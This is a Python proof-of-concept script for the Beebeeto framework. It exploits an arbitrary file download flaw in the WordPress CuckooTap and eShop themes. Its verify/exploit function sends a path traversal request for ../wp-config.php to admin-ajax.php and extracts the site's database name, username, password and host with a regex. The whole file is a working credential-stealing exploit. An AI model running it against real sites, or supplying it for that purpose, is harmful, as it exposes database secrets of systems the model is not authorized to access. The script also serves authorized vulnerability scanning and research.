#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0008',
            'name': 'WordPress CuckooTap&eShop Themes 任意文件下载漏洞 POC',
            'author': 'foundu',
            'create_date': '2014-09-19',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'WordPress',
            'vul_version': [''],
            'type': 'Arbitrary File Download',
            'tag': ['WordPress', 'image_view.class.php', '任意文件下载漏洞', 'CuckooTap','eShop'],
            'desc': 'CuckooTap和eShop主题中image_view.class.php文件传入的img参数未经过过滤直接下载，造成任意文件下载，以至信息泄露。',
            'references': ['http://www.exploit-db.com/exploits/34511/',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        vul_url = '%s/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php' % args['options']['target']
        match_db = re.compile('define\(\'DB_[\w]+\', \'(.*)\'\);')
        if args['options']['verbose']:
            print '[*] Request URL: ' + vul_url
        response = urllib2.urlopen(urllib2.Request(vul_url)).read()
        data = match_db.findall(response)
        if data:
            args['success'] = True
            args['poc_ret']['vul_url'] = vul_url
            args['poc_ret']['Database'] = {}
            args['poc_ret']['Database']['DBname'] = data[0]
            args['poc_ret']['Database']['Username'] = data[1]
            args['poc_ret']['Database']['Password'] = data[2]
            args['poc_ret']['Database']['Hostname'] = data[3]
            return args
        else:
            args['success'] = False
            return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
